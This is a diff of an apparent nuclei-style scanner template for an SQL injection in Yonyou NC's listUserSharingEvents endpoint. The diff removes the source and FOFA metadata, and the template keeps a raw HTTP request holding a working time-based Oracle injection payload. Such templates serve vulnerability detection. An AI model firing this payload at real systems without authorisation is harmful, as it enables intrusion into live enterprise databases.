@@ -3,12 +3,8 @@ info:
   name: 用友NC listUserSharingEvents 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/phdege0bibk3x51n'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: phdege0bibk3x51n
-    fofa: app="用友-UFIDA-NC"
 http:
 - raw:
   - 'GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1'')+AND+1=dbms_pipe.receive_message(''RDS'',5)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1
